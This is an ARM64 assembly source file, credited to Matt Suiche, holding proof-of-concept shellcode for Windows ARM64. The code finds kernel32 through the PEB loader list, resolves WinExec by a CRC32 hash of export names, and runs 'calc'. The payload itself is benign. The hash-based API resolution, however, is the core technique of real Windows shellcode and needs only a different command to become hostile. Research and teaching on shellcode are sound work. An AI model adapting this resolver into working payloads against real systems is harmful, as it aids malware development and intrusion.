;
; Copyright (c) Matt Suiche. All rights reserved.
;
; Module Name:
; 
;   calc.asm
;
; Description:
; 
;   This is a simple shellcode that runs a WinExec('calc') for Windows ARM64.
;
; Author:
;
;   Matt Suiche (@msuiche) 20-June-2020 - Initial Implementation
;
; Environment:
; 
;   Userland
;

OFFSET_PEB           EQU 0x060
OFFSET_LDR_DATA      EQU 0x018
OFFSET_LOAD_ORDER    EQU 0x10
OFFSET_DLL_BASE      EQU 0x30

OFFSET_PE_HDR        EQU 0x3C

    AREA USER, CODE, READONLY

;    EXPORT GetK32Base

; GetK32Base PROC
;     mov    x8, x18
;     ldr    x19, [x8, #OFFSET_PEB]
;     ldr    x19, [x19, #OFFSET_LDR_DATA]
;     ldr    x19, [x19, #OFFSET_LOAD_ORDER]
;     ldr    x19, [x19] ; NTDLL
;     ldr    x19, [x19] ; KERNEL32
;     ldr    x0, [x19, #OFFSET_DLL_BASE] ; Kernel32 Base
;     ret
; GetK32Base ENDP

    EXPORT CalcShellcode
CalcShellcode PROC
    ; mov    x17, sp

    mov    x8, x18
    ldr    x19, [x8, #OFFSET_PEB]
    ldr    x19, [x19, #OFFSET_LDR_DATA]
    ldr    x19, [x19, #OFFSET_LOAD_ORDER]
    ldr    x19, [x19] ; NTDLL
    ldr    x19, [x19] ; KERNEL32
    ldr    x0, [x19, #OFFSET_DLL_BASE] ; Kernel32 Base

    ; Export Table (Names, Ordinals, Addresses)
    mov     w13,#0
    ldr     w8,[x0,#OFFSET_PE_HDR]
    mov     w7,#0x7E60
    movk    w7,#0xD592,lsl #0x10
    add     x9,x0,w8,uxtw
    ldr     w10,[x9,#0x88]
    add     x11,x0,w10,uxtw
    ldp     w12,w8,[x11,#0x20]
    ldr     w9,[x11,#0x1C]
    add     x14,x0,w8,uxtw
    add     x15,x0,w9,uxtw
    add     x11,x0,w12,uxtw

yyy_loop
    ldr     w10,[x11],#4
    mov     w9,#0
    ldrsb   w8,[x0,w10 uxtw #0]
    cbz     w8, yyy_next

    add     x10,x0,w10,uxtw

yyy_crc_loop
    crc32b   w9,w9,w8
    ldrsb    w8,[x10,#1]!
    cbnz     w8, yyy_crc_loop

    cmp     w9,w7
    beq     _break

yyy_next
    add     w13,w13,#1
    b       yyy_loop

_break
    ldrh    w8,[x14,w13 sxtw #1]
    ldr     w8,[x15,x8 lsl #2]
    add     x1,x0,w8,uxtw

    ; Allocate a small stack to save calc but that's unnecessary.
    ; stp    fp,lr,[sp,#-0x10]!
    ; mov    fp,sp
    ; mov    w8,#0x6163
    ; movk   w8,#0x636C,lsl #0x10
    ; str    xzr,[sp]
    ; mov    x0,sp
    ; str    w8,[sp]

    ; Save fp, lr before we do the call as it will be changed and hang otherwise.
    stp     fp, lr, [sp, # - 0x10]!
    mov     fp, sp
    ADR     x0, C_calc
    blr     x1
    ldp     fp,lr,[sp],#0x10

    ret
    ENDP

C_calc DCB "calc",0

STACK_BASE
    DCD 0,0,0,0,0
STACK_LIMIT

    END